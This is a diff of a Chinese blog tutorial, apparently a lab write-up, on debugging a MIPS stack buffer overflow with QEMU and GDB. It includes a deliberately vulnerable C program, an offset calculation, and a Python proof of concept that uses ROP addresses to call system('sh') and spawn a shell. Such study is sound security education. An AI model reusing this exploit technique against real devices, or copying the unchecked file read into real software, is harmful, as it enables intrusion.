@@ -456,54 +456,7 @@
         <h4 id="使用GDB调试MIPS架构的缓冲区溢出"><a href="#使用GDB调试MIPS架构的缓冲区溢出" class="headerlink" title="使用GDB调试MIPS架构的缓冲区溢出"></a>使用GDB调试MIPS架构的缓冲区溢出</h4><h4 id="环境介绍和准备工作"><a href="#环境介绍和准备工作" class="headerlink" title="环境介绍和准备工作"></a>环境介绍和准备工作</h4><p>测试的代码都是来自&lt;&lt;解密家用路由器0day挖掘技术&gt;&gt;一书,书上的调试使用的是QEMU + IDA来动态调试,由于最近在学习GDB的调试，所以尝试用QEMU + GDB来调试,权当练手了。</p>
 <p>测试使用的代码(下面代码中存在明显的缓冲区溢出漏洞)：</p>
 <a id="more"></a>
-<pre><code class="c">#include&lt;stdio.h&gt;
-#include&lt;sys/stat.h&gt;
-#include&lt;unistd.h&gt;
-
-void do_system(int code, char *cmd)
-{
-    char buf[255];
-    //sleep(1);
-    system(cmd);
-}
-
-void main()
-{
-    char buf[256] = {0};
-    char ch;
-    int count = 0;
-    unsigned int fileLen = 0;
-    struct stat fileData;
-    FILE *fp;
-    if(0 == stat(&quot;passwd&quot;, &amp;fileData))
-        fileLen = fileData.st_size;
-    else
-        return 1;
-
-    if ((fp = fopen(&quot;passwd&quot;, &quot;rb&quot;)) == NULL)
-    {
-        printf(&quot;Cannot open file passwd! \n&quot;);
-        exit(1);
-    }
-
-    ch = fgetc(fp);
-    while(count &lt;= fileLen){
-        buf[count++] = ch;
-        ch = fgetc(fp);
-    }
-    buf[--count] = &#39;\x00&#39;;
-
-    if (!strcmp(buf, &quot;adminpwd&quot;))
-    {
-        do_system(count, &quot;ls -l&quot;);
-    }
-    else
-    {
-        printf(&quot;you have an invalid password!\n&quot;);
-    }
-    fclose(fp);
-
-}</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system</span><span class="params">(<span class="keyword">int</span> code, <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">"passwd"</span>, &amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((fp = fopen(<span class="string">"passwd"</span>, <span class="string">"rb"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Cannot open file passwd! \n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ch = fgetc(fp);</span><br><span class="line">    <span class="keyword">while</span>(count &lt;= fileLen)&#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = '\x00';</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf, <span class="string">"adminpwd"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        do_system(count, <span class="string">"ls -l"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"you have an invalid password!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>使用mipsls-linux-gcc来编译程序</p>
 <blockquote>
 <p>mipsel-linux-gcc -g crash.c -static -o vuln_system</p>
@@ -523,16 +476,7 @@ void main()
 <li>-g 指定<code>qemu-mipsel</code>远程调试端口</li>
 </ul>
 <p>设置<code>gdb</code></p>
-<pre><code class="shell">gdb-multiarch ./vuln_system
-
-# 打开gdb后进行如下设置
-
-pwndbg&gt; set endian little #设置小端序
-The target is assumed to be little endian
-pwndbg&gt; set architecture mips #设置为Mips架构
-The target architecture is assumed to be mips
-pwndbg&gt; target remote localhost:1234 #设置远程端口
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./vuln_system</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开gdb后进行如下设置</span></span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">set</span> endian little <span class="comment">#设置小端序</span></span></span><br><span class="line">The target is assumed to be little endian</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">set</span> architecture mips <span class="comment">#设置为Mips架构</span></span></span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> target remote localhost:1234 <span class="comment">#设置远程端口</span></span></span><br></pre></td></tr></table></figure>
 <p><img src="http://file.smilehacker.net/Gdbset.png" alt="GDB调试设置"></p>
 <p>现在重新生成<code>passwd</code>文件,使用python向文件中写入600个A</p>
 <blockquote>
@@ -545,30 +489,16 @@ pwndbg&gt; target remote localhost:1234 #设置远程端口
 <h5 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h5><p>通过静态分析发现,如果要使缓冲区溢出,并控制到堆栈中的返回地址saved_ra,需要覆盖的数据大小应该达到0x1A0-0x04即0x19c字节;作者这里运用这个公式的依据是什么呢?让我们回顾一下X86架构下的情形:</p>
 <p>偏移不就是找buf和ra之间的偏移么,ra是存储于栈里面的(有点类似于x86里面的ret指令),buf指向栈里面,只要计算出buf的初始位置和ra之间的偏移,就可以计算出有多少个字节就可以溢出到ra了！</p>
 <h5 id="寻找偏移"><a href="#寻找偏移" class="headerlink" title="寻找偏移"></a>寻找偏移</h5><p><img src="http://file.smilehacker.net/findoffest.png" alt="寻找偏移"></p>
-<pre><code class="Mips">addiu   $sp, -0x1D0            //sp &lt;==sp-0x1D0
-sw      $ra, 0x1D0+var_4($sp)  //将ra里面的值存放于堆栈里面,其偏移值为                                            0x1D0+var_4
-sw      $fp, 0x1D0+var_8($sp)  //将fp里面的值存放于堆栈里面,其偏移为0x1D0+var_8
-move    $fp, $sp                //fp&lt;== sp
-li      $gp, 0x4291A0           //li指令:将一个立即数存放于寄存器里面
-sw      $gp, 0x1D0+var_1C0($sp) //将gp里面的值存放于堆栈里面,其偏移为                                        0x1D0+var_1C0
-addiu   $v0, $fp, 0x1D0+var_1A0    //v0用于存放函数函数返回值
-li      $v1, 0x100        //将立即数0x100传入v1
-move    $a2, $v1          //MIPS架构中一般使用a0-a3作为函数的前4个参数
-move    $a1, $zero        //zero寄存器里面永远为0
-move    $a0, $v0          //a0=v0
-la      $v0, memset      //复制memset地址至至v0中
-move    $t9, $v0         //$t0-$t9供汇编程序使用的临时变量
-bal     memset           //无条件转移,并且将转移指令后面的第二条地址作为返回值存放                                于Ra里面
-nop</code></pre>
+<figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">addiu   $sp, -0x1D0            //sp &lt;==sp-0x1D0</span><br><span class="line">sw      $ra, 0x1D0+var_4($sp)  //将ra里面的值存放于堆栈里面,其偏移值为											0x1D0+var_4</span><br><span class="line">sw      $fp, 0x1D0+var_8($sp)  //将fp里面的值存放于堆栈里面,其偏移为0x1D0+var_8</span><br><span class="line">move    $fp, $sp                //fp&lt;== sp</span><br><span class="line">li      $gp, 0x4291A0           //li指令:将一个立即数存放于寄存器里面</span><br><span class="line">sw      $gp, 0x1D0+var_1C0($sp) //将gp里面的值存放于堆栈里面,其偏移为										0x1D0+var_1C0</span><br><span class="line">addiu   $v0, $fp, 0x1D0+var_1A0    //v0用于存放函数函数返回值</span><br><span class="line">li      $v1, 0x100        //将立即数0x100传入v1</span><br><span class="line">move    $a2, $v1          //MIPS架构中一般使用a0-a3作为函数的前4个参数</span><br><span class="line">move    $a1, $zero        //zero寄存器里面永远为0</span><br><span class="line">move    $a0, $v0          //a0=v0</span><br><span class="line">la      $v0, memset      //复制memset地址至至v0中</span><br><span class="line">move    $t9, $v0         //$t0-$t9供汇编程序使用的临时变量</span><br><span class="line">bal     memset           //无条件转移,并且将转移指令后面的第二条地址作为返回值存放								于Ra里面</span><br><span class="line"><span class="keyword">nop</span></span><br></pre></td></tr></table></figure>
+
 <p>结合源代码看,可以发现主函数里面调用的第一个函数为<code>memset</code>函数,但是源代码中没有调用这个函数,发现在调用这个函数之前是调用了3个参数的,分别用到<code>a0</code>,<code>a1</code>,和<code>a2</code>这几个寄存器,而函数<code>memset</code>的原型为<code>void* memset(void* s,int ch,unsigned n)</code>，其主要功能为:在内存空间里以s为起始的地方,将开始的n个字节设为指定值;可以发现传给<code>a2</code>的值为<code>v1</code>,而传给<code>$v1</code>的为<code>0x100</code>(0x100实际上就是十进制256),这里在做的事情是内存初始化,通过这个函数将内存里面的<code>256</code>个字节初始化为<code>0</code>,而这里的内存初始地址是通过指令<code>addiu $v0,$fp,0x1D0+var_1A0</code>来确定的,显然,<code>0x1D0+var_1A0</code>就是我们要找的buf的起始偏移，到这里,我们才能确定:需要覆盖的数据大小应该为<code>0x1D0+var_1A0-0x1D0-var_4</code>即<code>0x19c</code>字节;</p>
 <h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>我们将0x19C以后的数据设置成<code>BBBB</code>(0x42424242),如果我们猜测正确,那程序会被劫持到0x424242处</p>
 <blockquote>
 <p>tt@ubuntu:~$ python -c “print ‘A’*0x19c + ‘BBBB’+’CCCC’”&gt;passwd</p>
 </blockquote>
 <p>接下来使用GDB查看main函数的代码，并在main函数结尾处下断点</p>
-<pre><code class="shell">disassemble main # 查看main函数的汇编代码
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">disassemble main # 查看main函数的汇编代码</span><br><span class="line"></span><br><span class="line">break *main+740 # 在main函数后740行处下断点</span><br></pre></td></tr></table></figure>
 
-break *main+740 # 在main函数后740行处下断点</code></pre>
 <p><img src="http://file.smilehacker.net/gccbreaks.png" alt="汇编下断点"></p>
 <p>断点下好后输入<code>c</code>,让程序运行到刚刚下的断点处</p>
 <p><img src="http://file.smilehacker.net/return.png" alt="继续运行"></p>
@@ -582,32 +512,8 @@ break *main+740 # 在main函数后740行处下断点</code></pre>
 <p>在缓冲区溢出时,直接让<code>ra</code>的值指向<code>0x00401FA0</code>,<strong>因为<code>ROP技术</code>使用的堆栈都是同一个堆栈</strong>，只要让<code>$sp+0x58+var_40</code>的值为想要执行的命令,并且在<code>$sp+0x58+var_4</code>处的值存放成跳转到<code>do_system_0</code>函数的地址(<code>0x00400678</code>),就可以达到目的。</p>
 <p><img src="http://file.smilehacker.net/RAreturn.png" alt="设置RA的值"></p>
 <p>现在整理一下当前栈帧:<br><img src="http://file.smilehacker.net/stackinfo.png" alt="当前栈帧"></p>
-<h4 id="整理POC"><a href="#整理POC" class="headerlink" title="整理POC"></a>整理POC</h4><pre><code class="python">&quot;&quot;&quot;
-struct.pack(&quot;&lt;L&quot;,&quot;xxx&quot;)为小端序
-struct.pack(&quot;&gt;L&quot;,&quot;xxx&quot;)为大端序
-&quot;&quot;&quot;
-import struct
+<h4 id="整理POC"><a href="#整理POC" class="headerlink" title="整理POC"></a>整理POC</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">struct.pack("&lt;L","xxx")为小端序</span></span><br><span class="line"><span class="string">struct.pack("&gt;L","xxx")为大端序</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">"sh"</span> 				<span class="comment"># command string</span></span><br><span class="line">cmd += <span class="string">"\x00"</span>*(<span class="number">4</span> - (len(cmd) % <span class="number">4</span>))	<span class="comment"># align by 4 bytes</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">shellcode = <span class="string">"A"</span>*<span class="number">0x19C</span> 			<span class="comment"># padding buf</span></span><br><span class="line">shellcode += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x00401FA0</span>) </span><br><span class="line">shellcode += <span class="string">"A"</span>*<span class="number">24</span>				<span class="comment"># padding before command</span></span><br><span class="line">shellcode += cmd				<span class="comment"># command($a1)</span></span><br><span class="line">shellcode += <span class="string">"B"</span>*(<span class="number">0x3C</span> - len(cmd))		<span class="comment"># padding </span></span><br><span class="line">shellcode += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x00400678</span>) </span><br><span class="line">shellcode += <span class="string">"BBBB"</span>				<span class="comment"># padding</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">' ok!'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#create password file</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] create password file'</span>,</span><br><span class="line">fw = open(<span class="string">'passwd'</span>,<span class="string">'w'</span>)</span><br><span class="line">fw.write(shellcode)<span class="comment">#'A'*300+'\x00'*10+'BBBB')</span></span><br><span class="line">fw.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">' ok!'</span></span><br></pre></td></tr></table></figure>
 
-cmd = &quot;sh&quot;                 # command string
-cmd += &quot;\x00&quot;*(4 - (len(cmd) % 4))    # align by 4 bytes
-
-#shellcode
-shellcode = &quot;A&quot;*0x19C             # padding buf
-shellcode += struct.pack(&quot;&lt;L&quot;,0x00401FA0) 
-shellcode += &quot;A&quot;*24                # padding before command
-shellcode += cmd                # command($a1)
-shellcode += &quot;B&quot;*(0x3C - len(cmd))        # padding 
-shellcode += struct.pack(&quot;&lt;L&quot;,0x00400678) 
-shellcode += &quot;BBBB&quot;                # padding
-
-print &#39; ok!&#39;
-
-#create password file
-print &#39;[+] create password file&#39;,
-fw = open(&#39;passwd&#39;,&#39;w&#39;)
-fw.write(shellcode)#&#39;A&#39;*300+&#39;\x00&#39;*10+&#39;BBBB&#39;)
-fw.close()
-print &#39; ok!&#39;</code></pre>
 <p>将上述代码保存为<code>poc.py</code>,运行结果如下</p>
 <p><img src="http://file.smilehacker.net/result.png" alt="result"></p>
 <p>成功拿到shell</p>
